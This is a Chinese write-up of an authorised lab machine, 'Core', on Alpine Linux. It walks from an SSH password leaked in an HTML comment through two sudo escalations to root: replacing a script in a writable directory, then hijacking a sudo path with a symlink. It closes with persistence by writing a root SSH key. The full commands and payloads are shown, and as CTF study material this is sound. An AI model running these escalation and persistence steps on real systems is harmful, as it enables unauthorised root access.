# Core 靶机复盘：王炸方案进阶

> 本文记录的是隔离环境中的授权靶机复盘。凭据复用、sudo 脚本替换与符号链接劫持均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Core / Alpine Linux |
| 目标地址 | 192.168.134.67 |
| 开放端口 | 22/tcp、80/tcp |
| Web | Apache 2.4.67，MazeSec 静态展示页 |
| 最终路径 | HTML 注释泄露 SSH 口令 → 替换 `12138.sh` 到用户 111 → 符号链接劫持 `111.sh` → root |

![靶机启动与环境信息](/content/core/image-01.png) ![主机发现 / 目标确认](/content/core/image-02.png)

## 1. 攻击链概览

按作者的说法，这台机本来就很简单：Web 界面是给测试人员的致敬，入口就藏在成员卡片旁；切到 `111` 复用的是之前 Bomb 那套“可写目录替换 sudo 脚本”；最后一跳才是王炸方案的进阶版——符号链接劫持。

```text
80 端口源码注释
  → ll104567 / WJBCDJ1k36gYWKs9GjkS
  → SSH 登录 + user flag
  → sudo -l：(111) NOPASSWD /home/ll104567/12138.sh
  → 目录可写 → 替换脚本 → 任意代码以 111 运行（同 Bomb）
  → 111 的 sudo：NOPASSWD /home/111/111/111.sh
  → mv 原子目录 + ln -s 到可写目录（王炸进阶）
  → sudo 字面路径匹配、execve 跟随链接 → root
```

## 2. 枚举：注释里的 20 位口令

```bash
nmap -sT -sV -sC -O -p- 192.168.134.67
```

只开放 SSH 与 HTTP。主机名 `Core`，系统 Alpine。

![端口扫描确认 22 与 80](/content/core/image-03.png)

80 端口是 MazeSec 团队展示页——作者说入口就是为了致敬测试人员，所以页面上直接放了测试成员。目录扫描没有额外可写入口；`/cgi-bin/printenv` 能看到源码，但 shebang 被注释，不是主线。

![80 端口 MazeSec 首页](/content/core/image-04.png)

看源码时，成员 `ll104567` 的卡片旁有一段无属性 HTML 注释：

```html
<!-- WJBCDJ1k36gYWKs9GjkS -->
```

![源码注释泄露 20 位口令](/content/core/image-05.png)

直接拿去试 SSH：

```bash
ssh ll104567@192.168.134.67
# WJBCDJ1k36gYWKs9GjkS
```

登录成功，读取 user flag：

```text
flag{user-10ccf8c4b05e437def737342f1d9b33f}
```

![SSH 登录 ll104567 并拿 user flag](/content/core/image-06.png)

## 3. 提权第一级：ll104567 → 111（Bomb 同款）

这一级和之前的 Bomb 靶机同一思路：sudo 允许以另一用户免密执行某脚本，脚本虽归 root，但父目录归当前用户，直接删掉重写即可。

```bash
sudo -l
```

```text
(111) NOPASSWD: /home/ll104567/12138.sh
```

`12138.sh` 本身是 `root:root 755`，但父目录 `/home/ll104567` 归当前用户所有。有目录写权限就可以删掉原脚本再放一个同名文件，sudo 仍然按原路径执行。

```bash
cd /home/ll104567
rm -f 12138.sh
printf '#!/bin/bash\nid\nsudo -l\n' > 12138.sh
chmod +x 12138.sh
sudo -u 111 /home/ll104567/12138.sh
```

输出确认变成 `uid=1001(111)`，并看到下一级规则：

```text
(ALL : ALL) NOPASSWD: /home/111/111/111.sh
```

## 4. 提权第二级：111 → root（王炸方案进阶）

`/home/111/111/111.sh` 与子目录 `/home/111/111` 归 root，111 不能直接改脚本内容。但 `/home/111` 归 111 所有，可以把子目录改名，再放一个同名符号链接。相对“直接替换脚本内容”的王炸基础版，这里是用路径劫持让 sudo 跑到别处。

思路：

1. 由 `ll104567` 先放好 payload，并 `chmod +x`（111 对 `/home/ll104567` 无写权限）；
2. 替换后的 `12138.sh` 以 111 身份：`mv /home/111/111` → 备份，再 `ln -s /home/ll104567 /home/111/111`，最后 `sudo /home/111/111/111.sh`；
3. sudoers 按**字面路径**匹配 `/home/111/111/111.sh`，`execve` **跟随符号链接**，实际执行 `/home/ll104567/111.sh`，身份是 root。

```bash
# payload（需 ll104567 事先写好并 chmod +x）
printf '#!/bin/bash\nid\ncat /root/root.txt\n' > /home/ll104567/111.sh
chmod +x /home/ll104567/111.sh

# 12138.sh：改名 + 链接 + 触发
printf '#!/bin/bash\nmv /home/111/111 /home/111/111.bak\nln -s /home/ll104567 /home/111/111\nsudo /home/111/111/111.sh\n' > /home/ll104567/12138.sh
chmod +x /home/ll104567/12138.sh

sudo -u 111 /home/ll104567/12138.sh
```

得到 `uid=0(root)` 与 root flag：

```text
flag{root-dfb18999777ea8a3177050c859c98c04}
```

![两级 sudo 提权成功](/content/core/image-07.png)

本机 `/tmp` 是 nosuid，SUID bash 方案不可靠；更稳的是直接写 root 公钥：

```bash
# payload 里追加写入 /root/.ssh/authorized_keys
ssh -i id_ed25519 root@192.168.134.67
```

![写入 root 公钥获得稳定 Shell](/content/core/image-08.png)

复现结束后应还原：删掉符号链接、恢复 `/home/111/111`、还原 `12138.sh`、清理 payload。

## 5. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| HTML 注释 | 无属性注释也可能是完整 SSH 口令 |
| sudo 脚本替换 | 脚本 root 所有 ≠ 安全；父目录可写就能换内容（Bomb 同款） |
| 符号链接劫持 | sudoers 匹配字面路径，执行时跟随链接（王炸进阶） |
| 两级链 | ll104567 → 111 → root，每一级都是“目录属主可动路径” |
| 持久化 | 优先写 root SSH 公钥；别假设 `/tmp` SUID 一定可用 |

## 6. 作者的话

> 靶机很简单，入口就是为了致敬一下我们的测试人员，所以 web 界面就是我们的测试人员，切换 111 用户就是我之前那个 bomb 提权的过程，这个最后提权的就是王炸方案的进阶版。

## 7. 复盘

Core 确实简单，但线索排得很清楚：首页致敬测试人员并送口令，中间一跳复刻 Bomb，最后一跳把王炸从“换脚本内容”推到“换路径指向”。核心仍是那句话——**sudo 信任的是路径字符串，不是你以为的那个 inode**。
